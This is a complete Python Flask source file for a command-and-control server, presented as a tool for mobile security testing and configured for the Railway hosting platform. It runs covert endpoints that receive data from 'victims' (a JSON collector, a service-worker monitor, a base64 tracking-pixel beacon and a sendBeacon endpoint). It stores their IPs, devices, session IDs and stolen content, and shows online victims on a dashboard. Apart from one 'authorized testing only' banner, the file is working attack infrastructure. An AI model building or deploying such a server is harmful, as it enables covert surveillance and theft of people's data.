#!/usr/bin/env python3
"""
Railway-optimized Command & Control Server for Mobile Security Testing
Fixed version with better error handling and database initialization
"""

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
import sqlite3
import os
from datetime import datetime, timedelta
import base64
import time
import traceback

app = Flask(__name__)
CORS(app)

# Railway configuration
PORT = int(os.environ.get('PORT', 5000))
DATABASE = 'c2_data.db'

def init_db():
    """Initialize SQLite database with better error handling"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Drop existing tables to recreate them properly
        cursor.execute('DROP TABLE IF EXISTS collected_data')
        cursor.execute('DROP TABLE IF EXISTS victims')
        
        # Victims table
        cursor.execute('''
            CREATE TABLE victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                session_id TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                user_agent TEXT,
                ip_address TEXT,
                attack_type TEXT,
                status TEXT DEFAULT 'active'
            )
        ''')
        
        # Data collection table
        cursor.execute('''
            CREATE TABLE collected_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                data_type TEXT,
                data_content TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                source_url TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        log_activity("✅ Database initialized successfully")
        return True
        
    except Exception as e:
        log_activity(f"❌ Database initialization failed: {e}")
        return False

def log_activity(message, ip_address="server"):
    """Log server activity with better formatting"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] 📡 {message} | IP: {ip_address}")

def store_victim_data(victim_id, data_type, content, source_url, ip_address, user_agent, attack_type='unknown'):
    """Store victim data in SQLite database with better error handling"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Get session_id from content if available
        session_id = ''
        if isinstance(content, dict):
            session_id = content.get('session_id', '')
        
        # Update or insert victim info
        cursor.execute('''
            INSERT OR REPLACE INTO victims 
            (victim_id, session_id, last_seen, user_agent, ip_address, attack_type)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (victim_id, session_id, datetime.now(), user_agent, ip_address, attack_type))
        
        # Store data point
        content_str = json.dumps(content) if isinstance(content, dict) else str(content)
        cursor.execute('''
            INSERT INTO collected_data 
            (victim_id, data_type, data_content, source_url)
            VALUES (?, ?, ?, ?)
        ''', (victim_id, data_type, content_str, source_url))
        
        conn.commit()
        conn.close()
        
        log_activity(f"💾 Stored {data_type} for victim {victim_id[:12]}...", ip_address)
        return True
        
    except Exception as e:
        log_activity(f"❌ Database error in store_victim_data: {e}", ip_address)
        traceback.print_exc()
        return False

@app.route('/')
def dashboard():
    """Main C&C dashboard"""
    dashboard_html = '''
<!DOCTYPE html>
<html>
<head>
    <title>🎯 Mobile Security C&C Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff41; 
            min-height: 100vh;
            padding: 20px;
        }
        .header { 
            text-align: center; 
            margin-bottom: 30px; 
            padding: 30px;
            background: rgba(0, 255, 65, 0.1);
            border: 2px solid #00ff41;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
        }
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #00ff41;
            animation: glow 2s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 5px #00ff41; }
            to { text-shadow: 0 0 20px #00ff41, 0 0 30px #00ff41; }
        }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 20px; 
            margin-bottom: 30px; 
        }
        .stat-box { 
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff41;
            padding: 25px; 
            text-align: center;
            border-radius: 15px;
            transition: all 0.3s ease;
        }
        .stat-box:hover {
            box-shadow: 0 0 25px rgba(0, 255, 65, 0.5);
            transform: translateY(-5px);
        }
        .stat-number { 
            font-size: 2.5rem; 
            color: #ff6b6b;
            margin-bottom: 10px;
            text-shadow: 0 0 10px #ff6b6b;
        }
        .stat-label {
            color: #cccccc;
            font-size: 1.1rem;
        }
        .victims-section {
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff41;
            border-radius: 15px;
            padding: 25px;
            margin-top: 20px;
        }
        .victims-table { 
            width: 100%; 
            border-collapse: collapse; 
            margin-top: 20px; 
        }
        .victims-table th, .victims-table td { 
            border: 1px solid #00ff41; 
            padding: 12px; 
            text-align: left; 
            word-break: break-word;
        }
        .victims-table th { 
            background: rgba(0, 255, 65, 0.2);
            font-weight: bold;
        }
        .victims-table tr:nth-child(even) {
            background: rgba(0, 255, 65, 0.05);
        }
        .status-online { color: #00ff41; font-weight: bold; }
        .status-offline { color: #ff6b6b; }
        .status-away { color: #ffaa00; }
        button { 
            background: linear-gradient(45deg, #00ff41, #40ff80);
            color: #000; 
            border: none; 
            padding: 8px 15px; 
            cursor: pointer; 
            margin: 2px;
            border-radius: 20px;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        button:hover {
            background: linear-gradient(45deg, #40ff80, #80ff80);
            transform: scale(1.05);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.6);
        }
        .refresh-btn { 
            position: fixed; 
            top: 20px; 
            right: 20px;
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff41;
            padding: 15px;
            border-radius: 10px;
        }
        .activity-log {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid #00ff41;
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
            max-height: 300px;
            overflow-y: auto;
        }
        .log-entry {
            margin: 5px 0;
            padding: 8px;
            border-left: 3px solid #00ff41;
            padding-left: 15px;
            background: rgba(0, 255, 65, 0.05);
        }
        .log-time {
            color: #888;
            font-size: 0.9rem;
        }
        .error-message {
            background: rgba(255, 107, 107, 0.2);
            border: 1px solid #ff6b6b;
            color: #ff6b6b;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
        @media (max-width: 768px) {
            .header h1 { font-size: 1.8rem; }
            .stats { grid-template-columns: repeat(2, 1fr); }
            .victims-table { font-size: 0.9rem; }
            .refresh-btn { position: static; margin-bottom: 20px; }
        }
    </style>
</head>
<body>
    <div class="refresh-btn">
        <button onclick="refreshData()">🔄 Refresh Data</button>
        <div style="margin-top: 10px; color: #888; font-size: 0.9rem;">
            Auto-refresh: <span id="countdown">30</span>s
        </div>
    </div>

    <div class="header">
        <h1>🎯 Command & Control Dashboard</h1>
        <p>🌍 Mobile Security Testing C&C Server</p>
        <p style="margin-top: 10px; color: #ffaa00;">⚡ Powered by Railway - FIXED VERSION</p>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <div class="stat-number" id="total-victims">0</div>
            <div class="stat-label">Total Victims</div>
        </div>
        <div class="stat-box">
            <div class="stat-number" id="online-victims">0</div>
            <div class="stat-label">Online Now</div>
        </div>
        <div class="stat-box">
            <div class="stat-number" id="total-data">0</div>
            <div class="stat-label">Data Points</div>
        </div>
        <div class="stat-box">
            <div class="stat-number" id="server-uptime">0h</div>
            <div class="stat-label">Server Uptime</div>
        </div>
    </div>
    
    <div id="error-container"></div>
    
    <div class="victims-section">
        <h2>🎯 Active Victims</h2>
        <table class="victims-table">
            <thead>
                <tr>
                    <th>🆔 Victim ID</th>
                    <th>🎭 Attack Type</th>
                    <th>🌐 IP Address</th>
                    <th>⚡ Status</th>
                    <th>📱 Device</th>
                    <th>🛠️ Actions</th>
                </tr>
            </thead>
            <tbody id="victims-tbody">
                <tr><td colspan="6" style="text-align: center; color: #666; padding: 40px;">
                    🔄 Loading victim data...
                </td></tr>
            </tbody>
        </table>
    </div>

    <div class="activity-log">
        <h3>📡 Recent Activity</h3>
        <div id="activity-log-content">
            <div class="log-entry">
                <div class="log-time">[Server Start]</div>
                🚀 C&C Server initialized and ready for connections
            </div>
        </div>
    </div>

    <script>
        let activityLog = [];
        let countdown = 30;
        
        function showError(message) {
            const errorContainer = document.getElementById('error-container');
            errorContainer.innerHTML = `
                <div class="error-message">
                    <strong>⚠️ API Error:</strong> ${message}
                    <br><small>Check server logs for more details</small>
                </div>
            `;
        }
        
        function clearError() {
            document.getElementById('error-container').innerHTML = '';
        }
        
        function refreshData() {
            clearError();
            fetch('/api/victims')
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                    }
                    return response.json();
                })
                .then(data => {
                    updateDashboard(data);
                    addToActivityLog('📊 Dashboard data refreshed');
                })
                .catch(error => {
                    console.error('Error fetching data:', error);
                    showError(`Failed to fetch victim data: ${error.message}`);
                    addToActivityLog('❌ Failed to fetch dashboard data');
                });
        }
        
        function updateDashboard(data) {
            document.getElementById('total-victims').textContent = data.total || 0;
            document.getElementById('online-victims').textContent = data.online || 0;
            document.getElementById('total-data').textContent = data.data_points || 0;
            
            const tbody = document.getElementById('victims-tbody');
            tbody.innerHTML = '';
            
            if (!data.victims || data.victims.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; color: #666; padding: 40px;">📡 Waiting for victims to connect...</td></tr>';
                return;
            }
            
            data.victims.forEach(victim => {
                const row = tbody.insertRow();
                const timeSince = Math.floor((Date.now() - new Date(victim.last_seen).getTime()) / 1000);
                
                let status = 'offline';
                let statusText = 'Offline';
                if (timeSince < 120) {
                    status = 'online';
                    statusText = 'Online';
                } else if (timeSince < 600) {
                    status = 'away';
                    statusText = 'Away';
                }
                
                const deviceType = getDeviceType(victim.user_agent || '');
                const shortId = victim.victim_id.substring(0, 20) + '...';
                
                row.innerHTML = `
                    <td title="${victim.victim_id}">${shortId}</td>
                    <td>${victim.attack_type || 'unknown'}</td>
                    <td>${victim.ip_address || 'unknown'}</td>
                    <td class="status-${status}">${statusText} (${formatTime(timeSince)})</td>
                    <td>${deviceType}</td>
                    <td>
                        <button onclick="viewVictim('${victim.victim_id}')" title="View Details">👁️ View</button>
                    </td>
                `;
            });
        }
        
        function getDeviceType(userAgent) {
            if (userAgent.includes('iPhone')) return '📱 iPhone';
            if (userAgent.includes('iPad')) return '📱 iPad';
            if (userAgent.includes('Android')) return '📱 Android';
            if (userAgent.includes('Windows')) return '💻 Windows';
            if (userAgent.includes('Mac')) return '💻 Mac';
            return '❓ Unknown';
        }
        
        function formatTime(seconds) {
            if (seconds < 60) return `${seconds}s`;
            if (seconds < 3600) return `${Math.floor(seconds/60)}m`;
            if (seconds < 86400) return `${Math.floor(seconds/3600)}h`;
            return `${Math.floor(seconds/86400)}d`;
        }
        
        function viewVictim(victimId) {
            window.open(`/victim/${victimId}`, '_blank');
            addToActivityLog(`👁️ Viewing details for victim ${victimId.substring(0, 12)}...`);
        }
        
        function addToActivityLog(message) {
            const timestamp = new Date().toLocaleTimeString();
            activityLog.unshift({time: timestamp, message: message});
            
            if (activityLog.length > 20) {
                activityLog = activityLog.slice(0, 20);
            }
            
            updateActivityLog();
        }
        
        function updateActivityLog() {
            const logContent = document.getElementById('activity-log-content');
            logContent.innerHTML = activityLog.map(entry => `
                <div class="log-entry">
                    <div class="log-time">[${entry.time}]</div>
                    ${entry.message}
                </div>
            `).join('');
        }
        
        // Auto-refresh countdown
        setInterval(() => {
            countdown--;
            document.getElementById('countdown').textContent = countdown;
            
            if (countdown <= 0) {
                countdown = 30;
                refreshData();
            }
        }, 1000);
        
        // Initial load
        refreshData();
        
        // Update uptime display
        const startTime = Date.now();
        setInterval(() => {
            const uptimeSeconds = Math.floor((Date.now() - startTime) / 1000);
            const uptimeHours = Math.floor(uptimeSeconds / 3600);
            const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
            document.getElementById('server-uptime').textContent = `${uptimeHours}h ${uptimeMinutes}m`;
        }, 60000);
        
        console.log('🎯 C&C Dashboard loaded successfully');
    </script>
</body>
</html>
    '''
    return dashboard_html

@app.route('/collect', methods=['POST', 'OPTIONS'])
def collect_data():
    """Main data collection endpoint with better error handling"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json() or {}
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        victim_id = data.get('victim_id', f'unknown_{int(time.time())}')
        data_type = data.get('type', 'unknown')
        source_url = data.get('source_url', 'unknown')
        attack_type = data.get('attack_type', 'unknown')
        
        log_activity(f"📥 COLLECT: {data_type} from {victim_id[:12]}...", ip_address)
        
        success = store_victim_data(victim_id, data_type, data, source_url, ip_address, user_agent, attack_type)
        
        if success:
            return jsonify({'status': 'received', 'timestamp': datetime.now().isoformat()})
        else:
            return jsonify({'status': 'error', 'message': 'Database storage failed'}), 500
        
    except Exception as e:
        log_activity(f"❌ Error in collect_data: {e}")
        traceback.print_exc()
        return jsonify({'error': 'Internal server error', 'message': str(e)}), 500

@app.route('/monitor', methods=['POST', 'OPTIONS'])
def monitor_endpoint():
    """Background monitoring endpoint"""
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json() or {}
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        victim_id = data.get('victim_id') or f'monitor_{ip_address}_{int(time.time())}'
        
        log_activity(f"📡 MONITOR: Background data from {victim_id[:12]}...", ip_address)
        
        store_victim_data(victim_id, 'background_monitor', data, 'service_worker', ip_address, user_agent, 'background')
        
        return jsonify({'status': 'monitored'})
        
    except Exception as e:
        log_activity(f"❌ Error in monitor_endpoint: {e}")
        return jsonify({'error': 'failed'}), 500

@app.route('/pixel.gif')
def pixel_beacon():
    """Image beacon endpoint"""
    try:
        encoded_data = request.args.get('d', '')
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        
        if encoded_data:
            try:
                decoded_data = base64.b64decode(encoded_data).decode('utf-8')
                data = json.loads(decoded_data)
                victim_id = data.get('victim_id', f'pixel_{ip_address}')
                
                log_activity(f"🖼️ PIXEL: Image beacon from {victim_id[:12]}...", ip_address)
                store_victim_data(victim_id, 'pixel_beacon', data, 'image_beacon', ip_address, 'Image Beacon', 'pixel')
                
            except Exception as e:
                log_activity(f"❌ Error decoding pixel data: {e}")
        
        # Return 1x1 transparent GIF
        pixel_data = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
        return pixel_data, 200, {'Content-Type': 'image/gif'}
        
    except Exception as e:
        log_activity(f"❌ Error in pixel_beacon: {e}")
        return '', 500

@app.route('/beacon', methods=['POST'])
def beacon_endpoint():
    """Navigator.sendBeacon endpoint"""
    try:
        data = request.get_json() or json.loads(request.data.decode('utf-8'))
        ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        
        victim_id = data.get('victim_id', f'beacon_{ip_address}')
        log_activity(f"📡 BEACON: Navigator beacon from {victim_id[:12]}...", ip_address)
        
        store_victim_data(victim_id, 'beacon_data', data, 'navigator_beacon', ip_address, 'Navigator Beacon', 'beacon')
        
        return '', 204
        
    except Exception as e:
        log_activity(f"❌ Error in beacon_endpoint: {e}")
        return '', 500

@app.route('/api/victims')
def api_victims():
    """API endpoint for victim statistics with better error handling"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Test if tables exist
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='victims'")
        if not cursor.fetchone():
            log_activity("⚠️ Victims table doesn't exist, reinitializing database")
            conn.close()
            init_db()
            conn = sqlite3.connect(DATABASE)
            cursor = conn.cursor()
        
        # Get statistics with error handling
        try:
            cursor.execute('SELECT COUNT(*) FROM victims')
            total_victims = cursor.fetchone()[0] or 0
        except Exception:
            total_victims = 0
        
        try:
            five_minutes_ago = datetime.now() - timedelta(minutes=5)
            cursor.execute('SELECT COUNT(*) FROM victims WHERE last_seen > ?', (five_minutes_ago,))
            online_victims = cursor.fetchone()[0] or 0
        except Exception:
            online_victims = 0
        
        try:
            cursor.execute('SELECT COUNT(*) FROM collected_data')
            total_data = cursor.fetchone()[0] or 0
        except Exception:
            total_data = 0
        
        # Get victim details with error handling
        try:
            cursor.execute('''
                SELECT victim_id, attack_type, ip_address, last_seen, user_agent, status
                FROM victims 
                ORDER BY last_seen DESC 
                LIMIT 50
            ''')
            
            victims = []
            for row in cursor.fetchall():
                victims.append({
                    'victim_id': row[0],
                    'attack_type': row[1],
                    'ip_address': row[2],
                    'last_seen': row[3],
                    'user_agent': row[4],
                    'status': row[5]
                })
        except Exception as e:
            log_activity(f"⚠️ Error fetching victim details: {e}")
            victims = []
        
        conn.close()
        
        return jsonify({
            'total': total_victims,
            'online': online_victims,
            'data_points': total_data,
            'victims': victims
        })
        
    except Exception as e:
        log_activity(f"❌ Error in api_victims: {e}")
        traceback.print_exc()
        return jsonify({
            'error': 'Database error', 
            'message': str(e),
            'total': 0, 
            'online': 0, 
            'data_points': 0, 
            'victims': []
        }), 500

@app.route('/victim/<victim_id>')
def victim_details(victim_id):
    """Detailed victim information with error handling"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,))
        victim = cursor.fetchone()
        
        if not victim:
            return f"<h1>Victim not found: {victim_id}</h1>", 404
        
        cursor.execute('''
            SELECT data_type, data_content, timestamp, source_url 
            FROM collected_data 
            WHERE victim_id = ? 
            ORDER BY timestamp DESC
        ''', (victim_id,))
        data_points = cursor.fetchall()
        
        conn.close()
        
        # Generate detailed HTML report
        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>🎯 Victim: {victim_id}</title>
            <style>
                body {{ font-family: monospace; background: #0a0a0a; color: #00ff41; padding: 20px; }}
                .header {{ border: 2px solid #00ff41; padding: 20px; margin-bottom: 20px; border-radius: 10px; }}
                .data-entry {{ background: #1a1a1a; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }}
                .timestamp {{ color: #888; font-size: 0.9em; }}
                .data-type {{ color: #ff6b6b; font-weight: bold; margin: 5px 0; }}
                pre {{ background: #222; padding: 10px; border-radius: 5px; overflow-x: auto; color: #00ff41; }}
                button {{ background: #ff6b6b; color: #000; border: none; padding: 8px 15px; margin: 5px; cursor: pointer; border-radius: 5px; }}
                .back-btn {{ position: fixed; top: 20px; right: 20px; }}
            </style>
        </head>
        <body>
            <div class="back-btn">
                <button onclick="window.close()">❌ Close</button>
                <button onclick="location.reload()">🔄 Refresh</button>
            </div>
            
            <div class="header">
                <h1>🎯 Victim Analysis Report</h1>
                <p><strong>Victim ID:</strong> {victim_id}</p>
                <p><strong>Attack Type:</strong> {victim[7] if len(victim) > 7 else 'Unknown'}</p>
                <p><strong>IP Address:</strong> {victim[6] if len(victim) > 6 else 'Unknown'}</p>
                <p><strong>First Seen:</strong> {victim[3] if len(victim) > 3 else 'Unknown'}</p>
                <p><strong>Last Activity:</strong> {victim[4] if len(victim) > 4 else 'Unknown'}</p>
                <p><strong>Status:</strong> {victim[8] if len(victim) > 8 else 'Unknown'}</p>
            </div>
            
            <h2>📊 Collected Data Points ({len(data_points)} total)</h2>
        '''
        
        for data_point in data_points:
            data_type, content, timestamp, source_url = data_point
            try:
                formatted_content = json.dumps(json.loads(content), indent=2)
            except:
                formatted_content = str(content)
            
            html += f'''
            <div class="data-entry">
                <div class="timestamp">🕒 {timestamp}</div>
                <div class="data-type">📋 {data_type.upper()}</div>
                <div>📍 Source: {source_url}</div>
                <pre>{formatted_content}</pre>
            </div>
            '''
        
        html += '</body></html>'
        return html
        
    except Exception as e:
        log_activity(f"❌ Error in victim_details: {e}")
        return f"<h1>Error loading victim details: {e}</h1>", 500

@app.route('/health')
def health_check():
    """Health check endpoint for Railway"""
    return jsonify({
        'status': 'healthy',
        'service': 'mobile-security-c2',
        'timestamp': datetime.now().isoformat(),
        'version': '1.0.1-fixed'
    })

@app.route('/debug/db')
def debug_database():
    """Debug endpoint to check database status"""
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        
        # Check if tables exist
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = cursor.fetchall()
        
        # Count records
        victim_count = 0
        data_count = 0
        
        try:
            cursor.execute('SELECT COUNT(*) FROM victims')
            victim_count = cursor.fetchone()[0]
        except:
            pass
            
        try:
            cursor.execute('SELECT COUNT(*) FROM collected_data')
            data_count = cursor.fetchone()[0]
        except:
            pass
        
        conn.close()
        
        return jsonify({
            'database_file': DATABASE,
            'tables': [table[0] for table in tables],
            'victim_count': victim_count,
            'data_count': data_count,
            'status': 'ok'
        })
        
    except Exception as e:
        return jsonify({
            'error': str(e),
            'status': 'error'
        }), 500

def print_startup_banner():
    """Print server startup information"""
    print("=" * 60)
    print("🎯 MOBILE SECURITY C&C SERVER - FIXED VERSION")
    print("=" * 60)
    print("🚅 Platform: Railway")
    print("📡 Status: ONLINE")
    print(f"🌐 Port: {PORT}")
    print("💾 Database: SQLite (c2_data.db)")
    print("🔧 Version: 1.0.1-fixed")
    print("=" * 60)
    print("📱 Available Endpoints:")
    print("  GET  /              - Main dashboard")
    print("  POST /collect       - Data collection")
    print("  POST /monitor       - Background monitoring")
    print("  GET  /pixel.gif     - Image beacon")
    print("  POST /beacon        - Navigator beacon")
    print("  GET  /api/victims   - Victim statistics")
    print("  GET  /health        - Health check")
    print("  GET  /debug/db      - Database debug info")
    print("=" * 60)
    print("⚠️  FOR AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 60)

if __name__ == '__main__':
    # Initialize database
    init_success = init_db()
    
    if not init_success:
        print("❌ Failed to initialize database, continuing anyway...")
    
    # Print startup banner
    print_startup_banner()
    
    # Start server
    app.run(
        host='0.0.0.0',
        port=PORT,
        debug=False,
        threaded=True
    )
